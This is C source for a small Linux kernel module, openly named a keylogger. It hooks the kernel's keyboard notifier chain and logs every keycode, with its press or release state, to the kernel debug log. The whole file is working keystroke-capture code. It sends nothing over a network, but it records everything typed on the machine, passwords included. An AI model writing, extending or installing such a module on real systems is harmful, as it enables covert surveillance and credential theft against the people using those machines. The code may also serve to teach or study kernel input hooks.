#include <linux/module.h>	
#include <linux/kernel.h>	
#include <linux/keyboard.h>

MODULE_LICENSE("GPL");

int logger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param  *param = _param;

    if(code == KBD_KEYCODE)
    {
        printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = logger_notify,
};

static int logger_init(void)
{
    register_keyboard_notifier(&nb);
    return 0;
}

static void logger_release(void)
{
    unregister_keyboard_notifier(&nb);
}

module_init(logger_init);
module_exit(logger_release);
